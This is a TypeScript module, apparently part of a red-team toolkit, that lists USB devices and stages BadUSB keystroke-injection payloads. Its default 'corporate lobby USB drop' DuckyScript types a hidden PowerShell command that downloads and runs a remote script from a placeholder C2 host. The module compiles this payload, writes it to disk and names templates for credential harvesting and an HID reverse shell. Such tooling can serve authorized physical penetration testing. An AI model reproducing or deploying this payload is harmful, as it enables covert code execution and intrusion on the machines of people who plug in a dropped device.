/**
 * @module usb_audit
 * Software-only USB / BadUSB recon and payload staging — no dedicated hardware.
 * Dry-run: template paths only. Live: lsusb enum + payloads under .ourmine/ares/usb/.
 */
import * as fs from "node:fs"
import * as path from "node:path"
import { compileDuckyScript, generateHIDReportDescriptor } from "./physical.ts"
import { resolveDryRun } from "./exec_options.ts"
import { isToolAvailable } from "./tool_detection.ts"
import { brokerExec, ensureAresDir, writeArtifact } from "./ares/_base.ts"

export interface UsbFinding {
  id: string
  severity: "critical" | "high" | "medium" | "low" | "info"
  title: string
  detail: string
  evidence?: string
}

export interface UsbAuditResult {
  target: string
  dryRun: boolean
  devicesEnumerated: number
  findings: UsbFinding[]
  templatePaths: string[]
  artifacts: string[]
  payloadScript?: string
  summary: string
}

const DEFAULT_LOBBY_SCRIPT = [
  "REM OURMINE corporate lobby USB drop template",
  "DELAY 2000",
  "GUI r",
  "DELAY 500",
  "STRING powershell -NoP -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('https://C2/recon.ps1')\"",
  "ENTER",
].join("\n")

const TEMPLATE_NAMES = [
  "badusb_lobby_drop.dd",
  "badusb_cred_harvest.dd",
  "hid_reverse_shell.ino",
]

export function usbTemplatePaths(): string[] {
  const base = path.join(ensureAresDir("usb"), "templates")
  fs.mkdirSync(base, { recursive: true })
  return TEMPLATE_NAMES.map((n) => path.join(base, n))
}

export async function auditUsb(
  target: string,
  opts: { live?: boolean; dryRun?: boolean; duckyScript?: string; scenario?: string } = {},
): Promise<UsbAuditResult> {
  const dryRun = resolveDryRun(opts)
  const templates = usbTemplatePaths()
  const empty: UsbAuditResult = {
    target,
    dryRun: true,
    devicesEnumerated: 0,
    findings: [],
    templatePaths: templates,
    artifacts: templates,
    summary: "dry-run: USB template paths only — set OURMINE_LIVE=1 for lsusb + payload gen",
  }
  if (dryRun) return empty

  const findings: UsbFinding[] = []
  const artifacts: string[] = []
  let devicesEnumerated = 0
  const script = opts.duckyScript ?? DEFAULT_LOBBY_SCRIPT

  if (isToolAvailable("lsusb")) {
    const r = await brokerExec("lsusb")
    if (r.ok) {
      const lines = r.out.split("\n").filter((l) => l.trim())
      devicesEnumerated = lines.length
      for (const line of lines.slice(0, 12)) {
        findings.push({
          id: `usb-dev-${findings.length}`,
          severity: "info",
          title: "USB device present",
          detail: line.trim().slice(0, 120),
          evidence: line.trim(),
        })
      }
    }
  } else {
    findings.push({
      id: "usb-no-lsusb",
      severity: "low",
      title: "lsusb unavailable",
      detail: "Install usbutils for live USB enumeration",
    })
  }

  const ducky = compileDuckyScript(script, false)
  const hexPath = writeArtifact("usb", `badusb_${Date.now()}.hex`, ducky.compiledPayloadHex)
  const scriptPath = writeArtifact("usb", `badusb_${Date.now()}.dd`, script)
  const hid = generateHIDReportDescriptor()
  const hidPath = writeArtifact("usb", `hid_descriptor_${Date.now()}.json`, JSON.stringify(hid, null, 2))
  artifacts.push(hexPath, scriptPath, hidPath)

  findings.push({
    id: "badusb-staged",
    severity: "high",
    title: "BadUSB payload staged",
    detail: `${opts.scenario ?? "lobby_drop"} — HID injection script compiled`,
    evidence: scriptPath,
  })

  return {
    target,
    dryRun: false,
    devicesEnumerated,
    findings,
    templatePaths: templates,
    artifacts,
    payloadScript: script,
    summary: `USB audit: ${devicesEnumerated} device(s), ${artifacts.length} artifact(s) in .ourmine/ares/usb/`,
  }
}

export default { auditUsb, usbTemplatePaths }
